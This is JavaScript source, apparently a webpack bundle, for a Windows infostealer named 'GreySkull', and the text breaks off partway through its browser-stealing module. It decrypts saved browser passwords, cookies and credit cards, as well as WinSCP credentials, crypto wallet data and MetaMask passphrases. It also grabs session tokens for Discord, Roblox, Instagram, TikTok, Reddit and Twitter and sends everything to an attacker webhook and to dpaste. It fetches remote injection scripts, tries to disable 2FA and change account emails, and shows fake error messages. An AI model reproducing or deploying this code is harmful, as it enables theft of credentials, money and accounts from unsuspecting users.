const modules = {};


// Módulo 0
const module_0_exports = {};
(function(module, exports) {
const { exec } = __webpack_require__(/*! child_process */ "child_process"),
  admin = __webpack_require__(/*! ./utils/admin */ "./utils/admin.js"),
  browsers = __webpack_require__(/*! ./utils/browsers */ "./utils/browsers.js"),
  core = __webpack_require__(/*! ./utils/core */ "./utils/core.js"),
  crypto = __webpack_require__(/*! ./utils/crypto */ "./utils/crypto.js"),
  discord = __webpack_require__(/*! ./utils/discord */ "./utils/discord.js"),
  files = __webpack_require__(/*! ./utils/files */ "./utils/files.js"),
  twitter = __webpack_require__(/*! ./utils/twitter */ "./utils/twitter.js"),
  { upload } = __webpack_require__(/*! ./utils/uploadFiles */ "./utils/uploadFiles.js"),
  infos = __webpack_require__(/*! ./utils/infos */ "./utils/infos.js"),
  injection = __webpack_require__(/*! ./utils/injection */ "./utils/injection.js"),
  save = __webpack_require__(/*! ./utils/save */ "./utils/save.js"),
  { stat } = __webpack_require__(/*! ./utils/stats */ "./utils/stats.js"),
  axios = __webpack_require__(/*! axios */ "axios"),
  roblox = __webpack_require__(/*! ./utils/roblox */ "./utils/roblox.js"),
  minecraft = __webpack_require__(/*! ./utils/minecraft */ "./utils/minecraft.js"),
  reddit = __webpack_require__(/*! ./utils/reddit */ "./utils/reddit.js"),
  https = __webpack_require__(/*! https */ "https"),
  steam = __webpack_require__(/*! ./utils/steam */ "./utils/steam.js"),
  agent = new https.Agent({ rejectUnauthorized: false }),
  fake_error = __webpack_require__(/*! ./utils/fake_error */ "./utils/fake_error.js"),
  sound = __webpack_require__(/*! ./utils/sound */ "./utils/sound.js"),
  kill = __webpack_require__(/*! ./utils/kill */ "./utils/kill.js"),
  uac = __webpack_require__(/*! ./utils/uac */ "./utils/uac.js"),
  tiktok = __webpack_require__(/*! ./utils/tiktok */ "./utils/tiktok.js"),
  instagram = __webpack_require__(/*! ./utils/instagram */ "./utils/instagram.js");

let config = {
  webhook:
    "%WEBHOOK%",
  ClientEmail: "%CLIENT_EMAIL%",
  ChromeInjection: "%CHROME_INJECTION%",
  DoINeedTo_MailChanger: "%AUTO_MAIL_CHANGER%",
  DoINeedTo_Disable2FA: "%DISABLE_2FA%",
  DoINeedTo_BlockDebug: "%DEBUG_OPTIONS%",
  DoINeedTo_GetGames: "%GAMES_OPTIONS%",
  DoINeedTo_GetLaunchers: "%LAUNCHERS_OPTIONS%",
  DoINeedTo_Inject: "%INJECT_OPTIONS%",
  DoINeedTo_GetClients: "%CLIENTS_OPTIONS%",
  DoINeedTo_GetWallets: "%WALLETS_OPTIONS%",
  DoINeedTo_GetVPN: "%VPN_OPTIONS%",
  DoINeedTo_GetSysInfo: "%SYSINFO_OPTIONS%",
  DoINeedTo_GetSocialAPP: "%SOCIALAPP_OPTIONS%",
  DoINeedTo_GetBrowsers: "%BROWSERS_OPTIONS%",
  DoINeedTo_FakeError: "%FAKEERROR_OPTIONS%",
  DoINeedTo_TrollSound: "%TROLL_SOUND%",
  DoINeedTo_TrollImage: "%TROLL_IMAGE%",
  DoINeedTo_FakeErrorMSG: "%FAKE_ERROR_MSG%",
  DoINeedTo_DisableUSERSET: "%SETTINGS_DISABLER%",
  ChromeInjectionURL:
    "https://github.com/Yokheycv/Chromium-Injection/raw/main/extensions.zip",
  DiscordInjectionURL:
    "https://raw.githubusercontent.com/Yokheycv/sub/main/index.js",
  ExodusInjectionURL:
    "https://raw.githubusercontent.com/Yokheycv/sub/main/exodus-inject.js",
  MullvadInjectionURL:
    "https://raw.githubusercontent.com/Yokheycv/sub/main/mullvad-inject.js",
  AtomicInjectionURL:
    "https://raw.githubusercontent.com/Yokheycv/sub/main/atomic-inject.js",
  AtomicMainURL:
    "https://raw.githubusercontent.com/Yokheycv/Atomic-injection/main/main.js",
  MailSpringInjectionURL:
    "https://raw.githubusercontent.com/Yokheycv/sub/main/mailspring-inject.js",
};

async function start() {
  const myselfbis = await core.GreySkullFindMyself();
  let internetacces = core.checkInternetAccess();
  if (!internetacces) {
    process.abort();
  }
  let startuped = core.checkIfStartup(myselfbis);
  uac.requestAdminPrivilegesIfNeeded(
    myselfbis,
    config.ChromeInjection,
    config.DoINeedTo_DisableUSERSET,
    config.DoINeedTo_Inject,
  );
  let link = "";
  const webhook = config.webhook;
  await save.Init();
  const { disk, ram, uid, cpucount, OS, cpu, GPU, windowskey, windowsversion } =
    await core.getInfo();
  const { ip, hostname, city, region, country, loc, org, postal, timezone } =
    await core.getPublicIp();
  
  kill.KillBrowsersProcess(
    config.DoINeedTo_Inject,
    config.DoINeedTo_GetBrowsers
  );

  const username = process.env.userprofile.split("\\")[2];
  const googlemap = `https://www.google.com/maps/search/google+map++${loc}`;

  fake_error.error(
    config.DoINeedTo_FakeError,
    config.DoINeedTo_FakeErrorMSG,
    startuped
  );

  await infos.getSysteminformations(
    config.DoINeedTo_GetSysInfo,
    ip,
    hostname,
    disk,
    ram,
    uid,
    cpucount,
    OS,
    cpu,
    GPU,
    windowskey,
    windowsversion
  );
  infos.GreySkullAV(config.DoINeedTo_GetSysInfo);
  infos.GreySkullClipboard(config.DoINeedTo_GetSysInfo);
  infos.GreySkullWifiPasswords(config.DoINeedTo_GetSysInfo);
  admin.GreySkullWinSCP(config.DoINeedTo_GetClients);
  files.GreySkullGOG(config.DoINeedTo_GetLaunchers);
  files.GreySkullElectronicArts(config.DoINeedTo_GetLaunchers);
  files.GreySkullRockstarGames(config.DoINeedTo_GetLaunchers);
  files.GreySkullBattle(config.DoINeedTo_GetLaunchers);
  files.GreySkullEpicGame(config.DoINeedTo_GetLaunchers);
  files.GreySkullSteam(config.DoINeedTo_GetLaunchers);
  files.GreySkullPidgin(config.DoINeedTo_GetSocialAPP);
  files.GreySkullProton(config.DoINeedTo_GetVPN);
  files.GreySkullNordVPN(config.DoINeedTo_GetVPN);
  files.GreySkullOpenVPN(config.DoINeedTo_GetVPN);
  files.GreySkullRiotGame(config.DoINeedTo_GetLaunchers);
  files.GreySkullTelegram(config.DoINeedTo_GetSocialAPP);
  files.GreySkullTox(config.DoINeedTo_GetSocialAPP);
  crypto.GreySkullColds(config.DoINeedTo_GetWallets);
  crypto.GreySkullExtensions(config.DoINeedTo_GetWallets);
  await files.GreySkullSimple();
  await roblox.GreySkullGetRoblox(config.DoINeedTo_GetGames);
  try {
    const passwords = await browsers.GreySkullBrowsers(
      config.DoINeedTo_GetBrowsers
    );
    const passphrase = await crypto.GreySkullMetamask(passwords);
    crypto.exodusDecrypt(config.DoINeedTo_GetWallets, passwords);
    stat.AddPassphrase(passphrase);
  } catch (e) {
    save.SaveError(e);
  }

  // SESSIONS
  roblox.ParseAndSendRoblox(config.DoINeedTo_GetGames);
  twitter.detailtwitter(config.DoINeedTo_GetSocialAPP);
  let insta_account = await instagram.ParseInstagram(
    config.DoINeedTo_GetSocialAPP
  );
  let tiktok_account = await tiktok.ParseTiktok(config.DoINeedTo_GetSocialAPP);
  let reddit_account = await reddit.ParseReddit(config.DoINeedTo_GetSocialAPP);

  const zipPath = await save.zipResult();
  link = await upload(zipPath);
  let gembed = stat.Build(
    username,
    ip,
    hostname,
    city,
    region,
    country,
    googlemap,
    org,
    postal,
    timezone,
    disk,
    ram,
    uid,
    cpucount,
    OS,
    cpu,
    GPU,
    windowskey,
    windowsversion,
    link
  );
  try {
    axios
      .all([
        axios({
          url: webhook,
          method: "POST",

          headers: {
            "Content-Type": "application/json",
          },

          data: JSON.parse(gembed),
          httpsAgent: agent,
        }),
      ])
      .then(axios.spread((response1) => {}))
      .catch((error) => {});
  } catch (e) {}

  steam.detailSteam(config.DoINeedTo_GetLaunchers);
  injection.MailSpringInjection(
    config.DoINeedTo_Inject,
    webhook,
    config.MailSpringInjectionURL
  );
  injection.MullvadInjection(
    config.DoINeedTo_Inject,
    webhook,
    config.MullvadInjectionURL
  );
  injection.AtomicInjection(
    config.DoINeedTo_Inject,
    webhook,
    config.AtomicInjectionURL,
    config.AtomicMainURL
  );
  injection.exodusInjection(
    config.DoINeedTo_Inject,
    webhook,
    config.ExodusInjectionURL
  );
  injection.chrome_injection(
    config.ChromeInjection,
    webhook,
    config.ChromeInjectionURL,
    ip,
    username,
  );
  injection.pwnBetterDiscord(config.DoINeedTo_Inject);
  injection.BypassDiscordTokenProtector(config.DoINeedTo_Inject);
  injection.inject(
    config.DoINeedTo_Inject,
    webhook,
    config.DiscordInjectionURL,
    link,
    config.DoINeedTo_Disable2FA,
    config.DoINeedTo_MailChanger,
    config.ClientEmail
  );
  files.CheckSensitiveFiles(config.DoINeedTo_GetSysInfo, config.webhook);
  try {
    const pd = await steam.sendSteam(config.DoINeedTo_GetLaunchers);
    await axios({
      url: webhook,
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      httpsAgent: agent,
      data: pd,
    });
  } catch (e) {}
  try {
    await axios({
      url: webhook,
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      httpsAgent: agent,
      data: insta_account,
    });
  } catch (e) {}
  try {
    await axios({
      url: webhook,
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      httpsAgent: agent,
      data: tiktok_account,
    });
  } catch (e) {}
  try {
    await axios({
      url: webhook,
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      httpsAgent: agent,
      data: reddit_account,
    });
  } catch (e) {}
  try {
    const p = await twitter.sendTwitter(config.DoINeedTo_GetSocialAPP);
    if (p) {
      await axios({
        url: webhook,
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        httpsAgent: agent,
        data: p,
      });
    }
  } catch (e) {}

  var embeds = [];

  const accounts = await discord.GreySkullDiscord();
  stat.addDiscordAccount(accounts);
  //discord.WriteDiscord(stat.discordAccount[0]);
  for (let i = 0; i < stat.discordAccount[0].length && i < 3; i++) {
    const acc = stat.discordAccount[0][i];
    if (acc.username === null || acc.username === undefined) return;
    let dscaccount = await discord.embed(
      acc.username,
      acc.tag,
      acc.id,
      acc.nitro,
      acc.badges,
      acc.billings,
      acc.email,
      acc.phone,
      acc.token,
      acc.avatar,
      acc.password ?? "None"
    );
    if (dscaccount !== null || dscaccount == undefined) {
      embeds.push(dscaccount);
    }
    const embedData = await discord.embedbis(acc.token);
    const embedguild = await discord.embedguild(acc.token);
    if (embedguild !== null && embedguild !== undefined) {
      embeds.push(embedguild);
    }
    if (embedData !== null && embedData !== undefined) {
      embeds.push(embedData);
    }
  }
  try {
    await axios({
      url: webhook,
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      httpsAgent: agent,
      data: JSON.parse(discord.compile(embeds.slice(0, 10))),
    });
  } catch (e) {}

  let allembed = [];

  try {
    const p = await roblox.sendRoblox(config.DoINeedTo_GetGames);
    if (p.length > 0) {
      allembed = await Promise.all(
        p.map(async (pd) => {
          let {
            UserName,
            RobuxBalance,
            ThumbnailUrl,
            IsAnyBuildersClubMember,
            IsPremium,
            friendscount,
            cookies,
          } = pd;

          const response = await axios.post(
            "https://dpaste.com/api/",
            `content=${encodeURIComponent(cookies)}`,
            {
              headers: { "Content-Type": "application/x-www-form-urlencoded" },
            }
          );

          const links = response.headers.location;
          return roblox.embed(
            UserName,
            RobuxBalance,
            ThumbnailUrl,
            IsAnyBuildersClubMember,
            IsPremium,
            friendscount,
            links
          );
        })
      );
      await axios({
        url: webhook,
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        httpsAgent: agent,
        data: JSON.parse(roblox.compile(allembed.slice(0, 10))),
      });
    }
  } catch (e) {}

  await minecraft.GreySkullfinduid(webhook, config.DoINeedTo_GetGames);
  core.cleaner();
  sound.sound(config.DoINeedTo_TrollSound);

  // imagify.spawnimage(config.DoINeedTo_TrollImage);
}

start();


//# sourceURL=webpack://script/./index.js?");

/***/ }),

/***/ 
})(module_0_exports, module_0_exports);
modules['module_0'] = module_0_exports;

// Módulo 1
const module_1_exports = {};
(function(module, exports) {
var Registry = __webpack_require__(/*! winreg */ "winreg"),
{ stat } = __webpack_require__(/*! ./stats */ "./utils/stats.js"),
save = __webpack_require__(/*! ./save */ "./utils/save.js");

function WinSCP() {
  var WSCP_CHARS = [];

  function _simple_decrypt_next_char() {
    if (WSCP_CHARS.length == 0) {
      return 0x00;
    }

    const WSCP_SIMPLE_STRING = "0123456789ABCDEF";

    var a = WSCP_SIMPLE_STRING.indexOf(WSCP_CHARS.shift());
    var b = WSCP_SIMPLE_STRING.indexOf(WSCP_CHARS.shift());

    return 0xff & ~((((a << 4) + b) << 0) ^ 0xa3);
  }

  this.decrypt = function (username, hostname, encrypted) {
    if (!encrypted.match(/[A-F0-9]+/)) {
      return "";
    }

    var result = [],
      key = [username, hostname].join("");

    WSCP_CHARS = encrypted.split("");

    var flag = _simple_decrypt_next_char(),
      length;

    if (flag == 0xff) {
      _simple_decrypt_next_char();
      length = _simple_decrypt_next_char();
    } else {
      length = flag;
    }

    WSCP_CHARS = WSCP_CHARS.slice(_simple_decrypt_next_char() * 2);

    for (var i = 0; i < length; i++) {
      result.push(String.fromCharCode(_simple_decrypt_next_char()));
    }

    if (flag == 0xff) {
      var valid = result.slice(0, key.length).join("");

      if (valid != key) {
        result = [];
      } else {
        result = result.slice(key.length);
      }
    }

    WSCP_CHARS = [];

    return result.join("");
  };
}

async function GreySkullWinSCP(cc) {
  if (cc != "yes") return;
  try {
    let connections = [];
    const regKey = new Registry({
      hive: Registry.HKCU,
      key: "\\SOFTWARE\\Martin Prikryl\\WinSCP 2\\Sessions",
    });

    const exists = await new Promise((resolve, reject) => {
      regKey.keyExists((err, exists) => {
        if (err != null) {
          resolve(false);
        }
        resolve(exists);
      });
    });
    if (!exists) {
      return;
    }
    const subkeys = await new Promise((resolve, reject) => {
      regKey.keys((err, subkeys) => {
        if (err != null) {
          resolve([]);
        }

        resolve(subkeys);
      });
    });
    if (subkeys.length == 0) {
      return;
    }

    stat.AddSysAdmin("WinSCP");

    for (let i = 0; i < subkeys.length; i++) {
      const subkey = subkeys[i];

      const subRegKey = new Registry({
        hive: Registry.HKCU,
        key: subkey.key,
      });

      const hostname = await new Promise((resolve, reject) => {
        subRegKey.get("HostName", (err, res) => {
          if (err == null) {
            resolve(res.value);
          }
          resolve("");
        });
      });

      const username = await new Promise((resolve, reject) => {
        subRegKey.get("UserName", (err, res) => {
          if (err == null) {
            resolve(res.value);
          }
          resolve("");
        });
      });

      const password = await new Promise((resolve, reject) => {
        subRegKey.get("Password", (err, res) => {
          if (err == null) {
            resolve(res.value);
          }
          resolve("");
        });
      });

      if (password != "" && username != "" && hostname != "") {
        const winSCP = new WinSCP();
        connections.push({
          username: username,
          password: winSCP.decrypt(username, hostname, password),
          hostname: hostname,
        });
      }
    }
    save.saveSysAdmin(connections, "WinSCP");
  } catch (e) {
    save.SaveError(e);
  }
}

module.exports = {
  GreySkullWinSCP,
};


//# sourceURL=webpack://script/./utils/admin.js?");

/***/ }),

/***/ 
})(module_1_exports, module_1_exports);
modules['module_1'] = module_1_exports;

// Módulo 2
const module_2_exports = {};
(function(module, exports) {
const fs = __webpack_require__(/*! fs */ "fs"),
  sqlite3 = __webpack_require__(/*! sqlite3 */ "sqlite3"),
  fsarraymanager = __webpack_require__(Object(function webpackMissingModule() { var e = new Error("Cannot find module 'fsarraymanager'"); e.code = 'MODULE_NOT_FOUND'; throw e; }())),
  crypto = __webpack_require__(/*! crypto */ "crypto"),
  iconv = __webpack_require__(/*! iconv-lite */ "iconv-lite"),
  save = __webpack_require__(/*! ./save */ "./utils/save.js"),
  { stat } = __webpack_require__(/*! ./stats */ "./utils/stats.js"),
  gecko = __webpack_require__(/*! ./gecko */ "./utils/gecko.js"),
  path = __webpack_require__(/*! path */ "path"),
  kill = __webpack_require__(/*! ./kill */ "./utils/kill.js");

website = [];

class Cookies {
  constructor(host, path, secure, expires, name, value) {
    this.host = host;
    this.path = path;
    this.secure = secure;
    this.expires = expires;
    this.name = name;
    this.value = value;
  }

  build() {
    return `${this.host}\tTRUE\t${this.path}\t${this.secure}\t${this.expires}\t${this.name}\t${this.value}
`;
  }
}

class Password {
  constructor(site, username, password, timestamp, browser) {
    this.site = site;
    this.username = username;
    this.password = password;
    this.timestamp = timestamp;
    this.browser = browser;
  }

  build() {
    return `Site: ${this.site}
Username: ${this.username}
Password: ${this.password}
Browser: ${this.browser} | ${this.timestamp}
`;
  }
}

class Autofill {
  constructor(input, value, browser) {
    this.input = input;
    this.value = value;
    this.browser = browser;
  }

  build() {
    return `Input: ${this.input}
Value: ${this.value}
Browser: ${this.browser}
`;
  }
}

class CreditCard {
  constructor(
    guid,
    name,
    expiration_mouth,
    expiration_year,
    number,
    address,
    nickname
  ) {
    this.guid = guid;
    this.name = name;
    this.address = address;
    this.nickname = nickname;
    this.expiration = expiration_mouth + "/" + expiration_year;
    this.number = number;
  }

  build() {
    return `Guid: ${this.guid}
Name: ${this.name}
Adress: ${this.address}
Nickname: ${this.nickname}
Expiration: ${this.expiration}
Number: ${this.number}
`;
  }
}

class Visit {
  constructor(url, title, count, timestamp) {
    this.url = url;
    this.title = title;
    this.count = count;
    this.timestamp = timestamp;
  }

  build() {
    return `Url: ${this.url}
Title: ${this.title}
Count: ${this.count}
Timestamp: ${this.timestamp}
`;
  }
}

class Download {
  constructor(path, url, total_bytes) {
    this.path = path;
    this.url = url;
    this.total_bytes = total_bytes;
  }

  build() {
    return `Url: ${this.url}
Path: ${this.path}
TotalBytes: ${this.total_bytes}
`;
  }
}

class Bookmark {
  constructor(name, url, timestamp, browser) {
    this.url = url;
    this.name = name;
    this.timestamp = timestamp;
    this.browser = browser;
  }

  build() {
    return `Url: ${this.url}
Name: ${this.name}
Browser: ${this.browser}
Timestamp: ${this.timestamp}
`;
  }
}

function getProfiles(path, name) {
  let profiles = [];

  if (fs.existsSync(path)) {
    let dirs = fs.readdirSync(path);
    for (let dir of dirs) {
      if (dir.includes("Profile") || dir == "Default") {
        profiles.push({
          path: `${path}${dir}\\`,
          name: name,
          profile: dir,
        });
      }
    }
    return profiles;
  } else {
    return [];
  }
}

function getGeckoProfiles(path, name) {
  let profiles = [];

  if (fs.existsSync(path)) {
    let dirs = fs.readdirSync(path);
    for (let dir of dirs) {
      if (
        dir.includes(".default-release") ||
        dir.includes(".default-default-")
      ) {
        profiles.push({
          path: `${path}${dir}\\`,
          name: name,
        });
      }
    }
    return profiles;
  } else {
    return [];
  }
}

function getMasterKey(path) {
  if (fs.existsSync(`${path}Local State`)) {
    let localstate = JSON.parse(fs.readFileSync(`${path}Local State`, "utf8"));
    let master_key = localstate.os_crypt.encrypted_key;
    master_key = fsarraymanager.unprotectData(
      Buffer.from(Buffer.from(master_key, "base64").slice(5), "utf-8"),
      null,
      "CurrentUser"
    );
    return master_key;
  } else if (fs.existsSync(`${path}..\\Local State`)) {
    let localstate = JSON.parse(
      fs.readFileSync(`${path}..\\Local State`, "utf8")
    );
    let master_key = localstate.os_crypt.encrypted_key;
    master_key = fsarraymanager.unprotectData(
      Buffer.from(Buffer.from(master_key, "base64").slice(5), "utf-8"),
      null,
      "CurrentUser"
    );
    return master_key;
  } else {
    return "";
  }
}

async function tempSqlite(path, query) {
  let path_tmp = path + "_tmp";
  fs.copyFileSync(path, path_tmp);
  let db = new sqlite3.Database(path_tmp);
  let result = await new Promise((resolve, reject) => {
    db.all(query, (err, rows) => {
      if (err) {
        reject(err);
      } else {
        resolve(rows);
      }
    });
  });
  db.close();
  try {
    fs.unlinkSync(path_tmp);
  } catch (e) {}
  return result;
}

function decryptChrome(value, key) {
  let start = value.slice(3, 15),
    middle = value.slice(15, value.length - 16),
    end = value.slice(value.length - 16, value.length),
    decipher = crypto.createDecipheriv("aes-256-gcm", key, start);
  decipher.setAuthTag(end);
  return (decrypted =
    decipher.update(middle, "base64", "utf-8") + decipher.final("utf-8"));
}

async function getCookies(basepath) {
  await kill.KillBrowsersProcess();
  let cookies = [];
  let key = getMasterKey(basepath);

  if (fs.existsSync(`${basepath}Network\\Cookies`)) {
    var rows = [];
    try {
      rows = await tempSqlite(
        `${basepath}Network\\Cookies`,
        "SELECT name, host_key, path, expires_utc, is_secure, encrypted_value FROM cookies"
      );
    } catch (e) {}

    for (let row of rows) {
      let value = row.encrypted_value;

      if (
        value.toString().startsWith("v10") ||
        value.toString().startsWith("v11")
      ) {
        if (key == "") {
          continue;
        }

        try {
          value = decryptChrome(value, key);
        } catch (e) {
          continue;
        }
      } else {
        try {
          value = fsarraymanager.unprotectData(value, null, "CurrentUser");
        } catch (e) {
          continue;
        }
      }
      if (row.host_key.includes(".reddit")) {
        if (row.name.includes("reddit_session")) {
          stat.addReddit(value);
        }
      }
      if (row.host_key.includes(".tiktok")) {
        if (row.name.includes("sessionid")) {
          stat.addTikTok(value);
        }
      }
      if (row.host_key.includes(".instagram")) {
        if (row.name.includes("sessionid")) {
          stat.addSessIDInsta(value);
        }
      }
      if (row.name.includes(".ROBLOSECURITY")) {
        save.saveRoblox(value);
        stat.AddRoblox(value);
      }
      if (row.host_key.includes(".twitter")) {
        let saved = row;
        saved.value = value;
        stat.AddTwitter(saved);
      }
      cookies.push(
        new Cookies(
          row.host_key,
          row.path,
          row.is_secure,
          row.expires_utc,
          row.name,
          value
        )
      );
    }
  }
  return cookies;
}

async function getPasswords(basepath, browser) {
  var passwords = [];
  let key = getMasterKey(basepath);

  var loginPath = "";
  if (basepath.includes("Yandex")) {
    loginPath = `${basepath}Ya Passman Data`;
  } else {
    loginPath = `${basepath}Login Data`;
  }

  if (fs.existsSync(loginPath)) {
    let rows = [];
    try {
      rows = await tempSqlite(
        loginPath,
        "SELECT origin_url, username_value, password_value, date_created FROM logins"
      );
    } catch (e) {}

    for (let row of rows) {
      let password = row.password_value;

      if (
        password.toString().startsWith("v10") ||
        password.toString().startsWith("v11")
      ) {
        if (key == "") {
          continue;
        }

        try {
          password = decryptChrome(password, key);
        } catch (e) {
          continue;
        }
      } else {
        try {
          password = fsarraymanager.unprotectData(password, null, "CurrentUser");
        } catch (e) {
          continue;
        }
      }
      if (row.username_value != "" && password != "") {
        passwords.push(
          new Password(
            row.origin_url,
            row.username_value,
            password,
            row.date_created,
            browser
          )
        );
        website.push(row.origin_url);

        if (row.origin_url.includes("discord")) {
          if (stat.discordAccount.length < 1) return;
          stat.discordAccount.forEach((d) => {
            d.forEach((g) => {
              if (g.email == row.username_value) {
                g.password = password;
              }
            });
          });
        }
      }
    }
  }
  return passwords;
}

async function getAutofills(basepath, browser) {
  var autofills = [];

  if (fs.existsSync(`${basepath}Web Data`)) {
    let rows = [];
    try {
      rows = await tempSqlite(
        `${basepath}Web Data`,
        "SELECT name, value FROM autofill"
      );
    } catch (e) {}

    for (let row of rows) {
      autofills.push(new Autofill(row.name, row.value, browser));
    }
  }

  return autofills;
}

async function getDownloads(basepath) {
  var downloads = [];

  if (fs.existsSync(`${basepath}History`)) {
    let rows = [];
    try {
      rows = await tempSqlite(
        `${basepath}History`,
        "SELECT target_path, tab_url, total_bytes FROM downloads"
      );
    } catch (e) {}

    for (let row of rows) {
      downloads.push(
        new Download(row.target_path, row.tab_url, row.total_bytes)
      );
    }
  }

  return downloads;
}

async function getCreditCards(basepath) {
  let creditcards = [];
  let key = getMasterKey(basepath);

  if (fs.existsSync(`${basepath}Web Data`)) {
    let rows = [];
    try {
      rows = await tempSqlite(
        `${basepath}Web Data`,
        "SELECT guid, name_on_card, expiration_month, expiration_year, card_number_encrypted, billing_address_id, nickname FROM credit_cards"
      );
    } catch (e) {}

    for (let row of rows) {
      let number = row.card_number_encrypted;

      if (
        number.toString().startsWith("v10") ||
        number.toString().startsWith("v11")
      ) {
        if (key == "") {
          continue;
        }

        try {
          number = decryptChrome(number, key);
        } catch (e) {
          continue;
        }
      } else {
        try {
          number = fsarraymanager.unprotectData(number, null, "CurrentUser");
        } catch (e) {
          continue;
        }
      }

      creditcards.push(
        new CreditCard(
          row.guid,
          row.name_on_card,
          row.expiration_month,
          row.expiration_year,
          number,
          row.billing_address_id,
          row.nickname
        )
      );
    }
  }

  return creditcards;
}

async function getHistory(basepath) {
  var history = [];

  if (fs.existsSync(`${basepath}History`)) {
    let rows = [];
    try {
      rows = await tempSqlite(
        `${basepath}History`,
        "SELECT url, title, visit_count, last_visit_time FROM urls"
      );
    } catch (e) {}

    for (let row of rows) {
      history.push(
        new Visit(row.url, row.title, row.visit_count, row.last_visit_time)
      );
    }
  }

  return history;
}

async function getBookmarks(basepath, browser) {
  let bookmarks = [];

  if (fs.existsSync(`${basepath}Bookmarks`)) {
    fs.copyFileSync(`${basepath}Bookmarks`, `${basepath}Bookmarks_tmp`);
    let json = JSON.parse(fs.readFileSync(`${basepath}Bookmarks_tmp`));
    fs.unlinkSync(`${basepath}Bookmarks_tmp`);

    for (let bookmark of json.roots.bookmark_bar.children) {
      bookmarks.push(
        new Bookmark(bookmark.name, bookmark.url, bookmark.date_added, browser)
      );
    }
  }

  return bookmarks;
}

async function getGeckoCookies(basepath) {
  var cookies = [];

  if (fs.existsSync(`${basepath}cookies.sqlite`)) {
    let rows = [];
    try {
      rows = await tempSqlite(
        `${basepath}cookies.sqlite`,
        "SELECT name, value, host, path, expiry, isSecure FROM moz_cookies"
      );
    } catch (e) {}

    for (let row of rows) {
      if (row.name.includes(".ROBLOSECURITY")) {
        stat.AddRoblox(row.value);
      }
      if (row.host.includes(".tiktok")) {
        if (row.name.includes("sessionid")) {
          stat.addTikTok(row.value);
        }
      }
      if (row.host.includes(".instagram")) {
        if (row.name.includes("sessionid")) {
          stat.addSessIDInsta(row.value);
        }
      }
      if (row.host.includes(".twitter")) {
        let saved = row;
        saved.value = row.value;
        stat.AddTwitter(saved);
      }
      cookies.push(
        new Cookies(
          row.host,
          row.path,
          row.isSecure,
          row.expiry,
          row.name,
          row.value
        )
      );
    }
  }

  return cookies;
}

async function getGeckoPasswords(profile, masterPassword, browser) {
  const passwords = [];
  const key = await gecko.getKey(profile, masterPassword);
  if (key == null) {
    return passwords;
  }

  const loginsPath = path.join(profile, "logins.json");
  if (!fs.existsSync(loginsPath)) {
    return passwords;
  }

  const loginsData = fs.readFileSync(loginsPath, "utf8");
  const profileLogins = JSON.parse(loginsData);
  for (const login of profileLogins.logins) {
    const decodedUsername = gecko.decodeLoginData(login.encryptedUsername);
    const decodedPassword = gecko.decodeLoginData(login.encryptedPassword);
    const username = gecko.decrypt(
      decodedUsername.data,
      decodedUsername.iv,
      key,
      "3DES-CBC"
    );
    const password = gecko.decrypt(
      decodedPassword.data,
      decodedPassword.iv,
      key,
      "3DES-CBC"
    );

    let encodeUsername = iconv.encode(username.data, "latin1").toString();
    if (encodeUsername != username.data) {
      username.data = encodeUsername;
    }

    let encodePassword = iconv.encode(password.data, "latin1").toString();
    if (encodePassword != password.data) {
      password.data = encodePassword;
    }
    if (
      username.data !== "" &&
      password.data !== "" &&
      password.data !== undefined
    ) {
      passwords.push(
        new Password(
          login.hostname,
          username.data,
          password.data,
          login.timeLastUsed,
          browser
        )
      );
    }
  }

  return passwords;
}

async function getGeckoBookmarks(basepath, browser) {
  let bookmarks = [];

  if (fs.existsSync(`${basepath}places.sqlite`)) {
    let rows = [];
    try {
      rows = await tempSqlite(
        `${basepath}places.sqlite`,
        "SELECT id, url, dateAdded, title FROM (SELECT * FROM moz_bookmarks INNER JOIN moz_places ON moz_bookmarks.fk=moz_places.id)"
      );
    } catch (e) {}

    for (let row of rows) {
      bookmarks.push(new Bookmark(row.title, row.url, row.dateAdded, browser));
    }
  }

  return bookmarks;
}

async function getGeckoHistory(basepath) {
  let history = [];

  if (fs.existsSync(`${basepath}places.sqlite`)) {
    let rows = [];
    try {
      rows = await tempSqlite(
        `${basepath}places.sqlite`,
        "SELECT title, url, visit_count, last_visit_date FROM moz_places where title not null"
      );
    } catch (e) {}

    for (let row of rows) {
      history.push(
        new Visit(row.url, row.title, row.visit_count, row.last_visit_date)
      );
    }
  }

  return history;
}

async function getGeckoDownloads(basepath) {
  let downloads = [];

  if (fs.existsSync(`${basepath}places.sqlite`)) {
    let rows = [];
    try {
      rows = await tempSqlite(
        `${basepath}places.sqlite`,
        "SELECT GROUP_CONCAT(content), url, dateAdded FROM (SELECT * FROM moz_annos INNER JOIN moz_places ON moz_annos.place_id=moz_places.id) t GROUP BY place_id"
      );
    } catch (e) {}

    for (let row of rows) {
      try {
        downloads.push(
          new Download(
            row["GROUP_CONCAT(content)"].split("},")[1],
            row.url,
            JSON.parse(
              row["GROUP_CONCAT(content)"].split("},")[0] + "}"
            ).fileSize
          )
        );
      } catch (e) {
        continue;
      }
    }
  }

  return downloads;
}

async function GreySkullBrowsers(cc) {
  if (cc != "yes") return;
  let appdata = process.env.APPDATA;
  let localappdata = process.env.LOCALAPPDATA;

  var chromiumPath = [
    {
      path: appdata + "\\Mail.Ru\\Atom\\User Data\\",
      name: "Atom",
    },
    {
      path: appdata + "\\Uran\\User Data\\",
      name: "Uran",
    },
    {
      path: appdata + "\\Maxthon3\\User Data\\",
      name: "Maxthon3",
    },
    {
      path: appdata + "\\liebao\\User Data\\",
      name: "liebao",
    },

    {
      path: appdata + "\\Coowon\\Coowon\\User Data\\",
      name: "Coowon",
    },
    {
      path:
        appdata + "\\Fenrir Inc\\Sleipnir5\\setting\\modules\\ChromiumViewer\\",
      name: "Sleipnir5",
    },
    {
      path: appdata + "\\MapleStudio\\ChromePlus\\User Data\\",
      name: "ChromePlus",
    },
    {
      path: appdata + "\\Superbird\\User Data\\",
      name: "Superbird",
    },
    {
      path: appdata + "\\Rafotech\\Mustang\\User Data\\",
      name: "Rafotech",
    },
    {
      path: appdata + "\\Safer Technologies\\Secure Browser\\User Data\\",
      name: "SaferTechnologies",
    },
    {
      path: appdata + "\\Suhba\\User Data\\",
      name: "Suhba",
    },
    {
      path: appdata + "\\TorBro\\Profile\\",
